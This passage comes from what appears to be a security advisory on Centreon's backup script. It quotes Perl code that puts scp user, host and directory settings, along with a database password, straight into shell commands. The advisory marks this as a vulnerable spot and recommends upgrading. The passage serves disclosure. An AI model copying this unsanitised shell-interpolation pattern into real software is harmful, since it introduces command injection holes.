             print STDERR "Cannot backup with LVM snapshot. Maybe you can try with mysqldump\n";
         }
     }

     my @partialBackupDays = split(/,/, $BACKUP_DATABASE_PARTIAL);
     if (grep $_ == $dayOfWeek, @partialBackupDays) {
         print "Dumping Db with LVM snapshot (partial)\n";
         `$CENTREONDIR/cron/centreon-backup-mysql.sh -b $TEMP_DB_DIR -d $today -p`;
         if ($? ne 0) {
             print STDERR "Cannot backup with LVM snapshot. Maybe you can try with mysqldump\n";
         }
     }
 } elsif (grep $_ == $dayOfWeek, @fullBackupDays) {
     my $mysql_database_ndo;
     my $dbh = DBI->connect("DBI:mysql:database=" . $mysql_database_oreon . ";host=" . $mysql_host . ";port=" . $mysql_port, $mysql_user, $mysql_passwd, { 'RaiseError' => 0, 'PrintError' => 0 });
     if (!$dbh) {
         print STDERR sprintf("Couldn't connect: %s", $DBI::errstr) . "\n";
     }

     my $file = "";

     # Make archives from databases dump
     if ($BACKUP_DATABASE_CENTREON == '1') {
         $file = $TEMP_DB_DIR . "/" . $today . "-centreon.sql.gz";
         `mysqldump -u $mysql_user -h $mysql_host -p'$mysql_passwd' $mysql_database_oreon | $BIN_GZIP  > $file`;
         if ($? ne 0) {
             print STDERR "Unable to dump database: " . $mysql_database_oreon . "\n";
         } else {
             print "Get mysqldump of \"" . $mysql_database_oreon . "\" database\n";
         }
     }

     # Make centreon_storage dump only if backup type is full
     if ($BACKUP_DATABASE_CENTREON_STORAGE == '1') {

         # Check if process already exist
         my $process_number = `ps aux | grep -v grep |grep "centstorage" | wc -l`;

         if ($process_number == 0) {
             $file = $TEMP_DB_DIR . "/" . $today . "-centreon_storage.sql.gz";
             `mysqldump -u $mysql_user -h $mysql_host -p'$mysql_passwd' $mysql_database_ods | $BIN_GZIP  > $file`;
             if ($? ne 0) {
                 print STDERR "Unable to dump database: " . $mysql_database_ods . "\n";
             } else {
                 print "Get mysqldump of \"" . $mysql_database_ods . "\" database\n";
             }
         }
     }
     $dbh->disconnect;
 }
 # End of Db dump
```
```pl
// Excerpt of the vulnerable code using the vulnerable scp parameters `$scp_user`, `$scp_host` and `$scp_directory`
sub exportBackup($) {
 my $export_type = shift; # 0 : database, 1 : configuration
 if ($scp_enabled == '1' &&
     (!defined($scp_host) || $scp_host ne '') &&
     (!defined($scp_directory) || $scp_directory ne '') &&
     (!defined($scp_user) || $scp_user ne '')
 ) {

     # Export database backups
     if ($export_type == 0 && ($BACKUP_DATABASE_CENTREON == '1' || $BACKUP_DATABASE_CENTREON_STORAGE == '1')) {
         chdir($TEMP_DB_DIR);
         `scp *.gz $scp_user\@$scp_host:$scp_directory/`;
         if ($? ne 0) {
             print STDERR "Error when trying to export files of " . $TEMP_DB_DIR . "\n";
         } else {
             print "All files were copied with success using SCP on " . $scp_user . "@" . $scp_host . ":" . $scp_directo>
         }
 }

     # Export configuration files backup
     if ($export_type == 1 && $BACKUP_CONFIGURATION_FILES == '1') {
         chdir($TEMP_CENTRAL_DIR);
         `scp *.gz $scp_user\@$scp_host:$scp_directory/`;
         if ($? ne 0) {
             print STDERR "Error when trying to export files of " . $TEMP_CENTRAL_DIR . "\n";
         } else {
             print "All files were copied with success using SCP on " . $scp_user . "@" . $scp_host . ":" . $scp_directo>
         }
 }
 } elsif ($scp_enabled == '1') {
     print STDERR "The export by SCP is enabled but a configuration is missing\n";
 }
}
```
### Mitgation
Please upgrade to the latest release of Centreon.

### Credits
[h00die-gr3y](h00die.gr3y@gmail.com)


---
